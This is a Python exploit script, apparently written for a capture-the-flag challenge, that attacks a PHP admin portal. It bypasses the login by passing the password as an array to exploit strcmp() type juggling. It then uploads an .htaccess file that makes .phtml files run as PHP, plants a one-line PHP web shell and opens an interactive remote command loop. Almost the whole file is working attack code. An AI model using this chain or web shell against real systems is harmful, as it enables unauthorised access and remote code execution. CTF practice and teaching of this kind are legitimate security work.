#!/usr/bin/env python3
"""
Exploit script for admin-portal CTF challenge
Demonstrates authentication bypass via PHP type juggling and file upload RCE
"""

import requests
import sys

# Configuration
# Get the actual instance URL from command line argument
TARGET_URL = "https://admin-panel-1525e60fcaad.instancer.sekai.team/"

print(f"[*] Target: {TARGET_URL}")

# Step 1: Bypass authentication using type juggling
print("[*] Step 1: Bypassing authentication via type juggling...")
login_url = f"{TARGET_URL}/login.php"

# Send password as array to trigger strcmp() type juggling
# strcmp(string, array) returns NULL, and NULL == 0 is true
# Use list of tuples to send password as array
login_data = [
    ("username", "peppy"),
    ("password[]", ""),
]

session = requests.Session()
response = session.post(login_url, data=login_data, allow_redirects=False)

print(f"[DEBUG] Status: {response.status_code}, Location: {response.headers.get('Location', 'None')}")

if response.status_code == 302 and "admin.php" in response.headers.get("Location", ""):
    print("[+] Authentication bypassed successfully!")
else:
    print("[-] Authentication bypass failed")
    


# Step 2: Upload .htaccess to enable PHP execution for .phtml files
print("[*] Step 2a: Uploading .htaccess...")

htaccess_content = """AddType application/x-httpd-php .phtml"""

files = {
    "file": (".htaccess", htaccess_content, "application/octet-stream")
}

admin_url = f"{TARGET_URL}admin.php"
response = session.post(admin_url, files=files, allow_redirects=False)

if response.status_code == 302:
    print("[+] .htaccess uploaded successfully")
else:
    print(f"[-] .htaccess upload failed: {response.text[:200]}")

# Step 2b: Upload malicious PHP file
print("[*] Step 2b: Uploading malicious file...")

# Bypass strategies:
# 1. Use .phtml extension (bypasses .php check)
# 2. Use <?= with passthru() which outputs directly
malicious_content = """<?=`{$_GET['cmd']}`?>"""

files = {
    "file": ("shell.phtml", malicious_content, "application/octet-stream")
}

response = session.post(admin_url, files=files, allow_redirects=False)

if response.status_code == 302:
    shell_url = f"{TARGET_URL}uploads/shell.phtml"  # Note: no double slash
    print(f"[+] File uploaded successfully: {shell_url}")

    # Step 3: Test command execution
    print("[*] Step 3: Testing command execution...")
    test_cmd = "id"
    cmd_response = session.get(f"{shell_url}?cmd={test_cmd}")

    if cmd_response.status_code == 200:
        print(f"[+] Command execution successful!")
        print(f"[+] Output: {cmd_response.text.strip()}")

        # Interactive shell
        print("\n[*] Entering interactive shell (type 'exit' to quit)...")
        while True:
            try:
                cmd = input("$ ")
                if cmd.lower() == "exit":
                    break
                result = session.get(f"{shell_url}?cmd={cmd}")
                print(result.text)
            except KeyboardInterrupt:
                print("\n[*] Exiting...")
                break
    else:
        print("[-] Command execution failed")
else:
    print("[-] File upload failed")
    print(f"Response: {response.text}")
